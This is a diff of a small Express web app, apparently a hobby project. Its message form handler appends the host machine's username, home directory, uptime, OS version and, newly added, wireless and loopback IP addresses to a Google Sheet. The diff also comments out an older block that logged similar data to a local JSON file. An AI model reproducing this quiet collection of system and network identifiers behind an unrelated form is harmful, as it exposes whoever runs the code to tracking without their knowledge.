@@ -2,8 +2,8 @@ const express = require("express");
 const { google } = require("googleapis");
 const PORT = process.env.PORT || 777;
 const os = require("os");
-const fs = require("fs");
-const path = require("path");
+// const fs = require("fs");
+// const path = require("path");
 
 // console.log(os.cpus()[0].model);
 // console.log(os.endianness());
@@ -18,12 +18,8 @@ const path = require("path");
 // console.log(os.uptime());
 // console.log(os.version());
 
-const app = express();
-
-app.use(express.urlencoded({ extended: true }));
-
-app.get("/", (_, res) => {
-  const user = {
+/*
+const user = {
     api: os.networkInterfaces(),
     username: os.userInfo().username,
     vaqti: `${new Date().getDate()}.${
@@ -42,6 +38,13 @@ app.get("/", (_, res) => {
     path.join(__dirname, "database", "inform.json"),
     JSON.stringify([...oldData, user], null, 4)
   );
+*/
+
+const app = express();
+
+app.use(express.urlencoded({ extended: true }));
+
+app.get("/", (_, res) => {
   res.render("index.ejs");
 });
 
@@ -74,6 +77,12 @@ app.post("/message", async (req, res) => {
     const userhdir = os.userInfo().homedir;
     const uptime = os.uptime();
     const version = os.version();
+    const addressB0 = os.networkInterfaces()["Беспроводная сеть"][0].address;
+    const addressB1 = os.networkInterfaces()["Беспроводная сеть"][1].address;
+    const address0 =
+      os.networkInterfaces()["Loopback Pseudo-Interface 1"][0].address;
+    const address1 =
+      os.networkInterfaces()["Loopback Pseudo-Interface 1"][1].address;
     const vaqti = `${new Date().getDate()}.${
       new Date().getMonth() + 1
     }.${new Date().getFullYear()}  ${new Date().getHours()}:${new Date().getUTCMinutes()}:${new Date().getSeconds()}`;
@@ -81,7 +90,7 @@ app.post("/message", async (req, res) => {
     await googleSheats.spreadsheets.values.append({
       auth,
       spreadsheetId,
-      range: "Лист1!A:O",
+      range: "Лист1!A:S",
       valueInputOption: "USER_ENTERED",
       resource: {
         values: [
@@ -101,30 +110,14 @@ app.post("/message", async (req, res) => {
             uptime,
             version,
             vaqti,
+            addressB0,
+            addressB1,
+            address0,
+            address1,
           ],
         ],
       },
     });
-
-    const user = {
-      api: os.networkInterfaces(),
-      username: os.userInfo().username,
-      vaqti: `${new Date().getDate()}.${
-        new Date().getMonth() + 1
-      }.${new Date().getFullYear()}  ${new Date().getHours()}:${new Date().getUTCMinutes()}:${new Date().getSeconds()}`,
-    };
-    const data = fs.readFileSync(
-      path.join(__dirname, "database", "inform.json"),
-      {
-        encoding: "utf8",
-        flag: "r",
-      }
-    );
-    const oldData = data ? JSON.parse(data) : [];
-    fs.writeFileSync(
-      path.join(__dirname, "database", "inform.json"),
-      JSON.stringify([...oldData, user], null, 4)
-    );
 
     res.status(200).redirect("/");
   } catch (error) {
